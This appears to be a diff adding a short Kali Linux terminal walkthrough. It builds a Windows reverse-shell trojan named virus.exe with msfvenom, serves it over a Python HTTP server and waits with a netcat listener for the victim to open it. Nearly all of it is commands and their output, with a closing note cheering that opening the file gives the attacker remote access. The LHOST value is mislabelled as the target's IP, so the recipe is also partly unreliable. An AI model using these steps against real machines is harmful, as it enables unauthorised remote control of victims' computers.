@@ -1,0 +1,20 @@
+┌──(root㉿kali)-[/home/kali]
+└─# msfvenom -l payloads | grep windows
+
+┌──(root㉿kali)-[/home/kali]
+└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=thetargetmachinsIP LPORT=444 -f exe -o virus.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: virus.exe
+
+┌──(root㉿kali)-[/home/kali]
+└─# python -m http.server 80
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nlvp 444 
+
+# In the Target Machine, you search for the IP of your Kali Machine, so you'd get the virus.exe we've created using MetasploitVenom. Once the victim's donwloaded and 
+opened the file, we get automatically remote access to the Target Machine, all this by a Reverse Shell...😊😊
